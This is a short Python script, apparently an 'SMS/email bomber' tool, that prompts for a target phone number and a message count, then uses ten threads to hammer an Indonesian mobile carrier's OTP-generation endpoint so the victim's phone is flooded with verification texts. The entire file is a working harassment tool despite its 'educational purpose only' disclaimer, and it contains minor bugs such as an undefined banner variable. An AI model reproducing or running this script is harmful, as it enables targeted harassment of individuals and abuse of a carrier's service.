#!/usr/bin/python
# -*- coding: utf-8 -*-
# Author : s3xy_n00b
# This tool is only for educational purpose only! 

print("""		::::::::::::::::::::::::::::::::::::::		:\033[1;36m E M A I L B O M B E R :		:------------------------------------:		: \033[1;32mAuthor : S3XY N00B \033[1;36m :		: \033[1;31mContact : https://m.me/s3xy.n00b.1 :		:::::::::::::::::::::::::::::::::::::: """)

from multiprocessing.pool import ThreadPool
try:
	import os, time, requests, sys
except ModuleNotFoundError:
	print("\nSeems like module requests Install")
	print("$ pip install requests\n")
	exit()

os.system('clear')
print(banner)
no = input("\033[1;37mEnter The Target Number =>\033[1;32m")
tot = int(input("\033[1;37Number of SMS =>\033[1;32m"))
spam = {'msisdn':no}
idk = '200'
def main(arg):
	try:
		r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = spam)
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m[+] Success")
		else:
			print("\033[1;31m[-] Failed")
	except: pass

jobs = []
for x in range(tot):
    jobs.append(x)
p=ThreadPool(10)
p.map(main,jobs)
